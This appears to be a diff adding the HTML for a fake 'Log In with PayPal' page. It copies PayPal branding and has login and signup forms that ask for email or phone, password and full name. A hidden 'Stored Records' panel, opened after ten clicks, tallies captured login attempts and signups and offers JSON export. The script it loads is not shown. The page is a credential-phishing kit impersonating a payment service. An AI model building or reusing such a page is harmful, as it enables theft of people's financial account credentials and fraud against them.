@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Log In with PayPal</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+  <!-- LOGIN SCREEN -->
+  <div id="login-screen" class="screen active">
+    <div class="login-card">
+      <div class="logo">
+        <span class="logo-pay">Pay</span><span class="logo-pal">Pal</span>
+      </div>
+      <h2>Log In</h2>
+      <form id="login-form" autocomplete="off">
+        <div class="input-group">
+          <label for="email">Email or phone number</label>
+          <input type="text" id="email" placeholder="Email or phone number" required>
+        </div>
+        <div class="input-group">
+          <label for="password">Password</label>
+          <input type="password" id="password" placeholder="Password" required>
+        </div>
+        <button type="submit" id="login-btn" class="btn-primary">Log In</button>
+      </form>
+      <div class="divider"><span>or</span></div>
+      <button id="signup-btn" class="btn-secondary">Sign Up</button>
+      <p class="forgot"><a href="#">Having trouble logging in?</a></p>
+      <div id="click-hint" class="click-hint"></div>
+    </div>
+  </div>
+
+  <!-- SIGNUP SCREEN -->
+  <div id="signup-screen" class="screen">
+    <div class="login-card">
+      <div class="logo">
+        <span class="logo-pay">Pay</span><span class="logo-pal">Pal</span>
+      </div>
+      <h2>Sign Up</h2>
+      <form id="signup-form" autocomplete="off">
+        <div class="input-group">
+          <label for="signup-name">Full Name</label>
+          <input type="text" id="signup-name" placeholder="Full name" required>
+        </div>
+        <div class="input-group">
+          <label for="signup-email">Email</label>
+          <input type="email" id="signup-email" placeholder="Email address" required>
+        </div>
+        <div class="input-group">
+          <label for="signup-password">Password</label>
+          <input type="password" id="signup-password" placeholder="Create a password" required>
+        </div>
+        <button type="submit" class="btn-primary">Create Account</button>
+      </form>
+      <p class="forgot"><a href="#" id="back-to-login">Already have an account? Log in</a></p>
+    </div>
+  </div>
+
+  <!-- DATA PANEL (hidden until 10 clicks) -->
+  <div id="data-screen" class="screen">
+    <div class="data-panel">
+      <div class="data-header">
+        <div class="logo">
+          <span class="logo-pay">Pay</span><span class="logo-pal">Pal</span>
+        </div>
+        <h2>📋 Stored Records</h2>
+        <button id="close-data" class="btn-close">&times;</button>
+      </div>
+      <div class="data-stats">
+        <div class="stat-card">
+          <span class="stat-num" id="stat-total">0</span>
+          <span class="stat-label">Total Entries</span>
+        </div>
+        <div class="stat-card">
+          <span class="stat-num" id="stat-logins">0</span>
+          <span class="stat-label">Login Attempts</span>
+        </div>
+        <div class="stat-card">
+          <span class="stat-num" id="stat-signups">0</span>
+          <span class="stat-label">Sign Ups</span>
+        </div>
+      </div>
+      <div class="data-actions">
+        <button id="export-btn" class="btn-small">📥 Export JSON</button>
+        <button id="clear-btn" class="btn-small btn-danger">🗑️ Clear All</button>
+      </div>
+      <div id="data-list" class="data-list"></div>
+    </div>
+  </div>
+
+  <script src="app.js"></script>
+</body>
+</html>
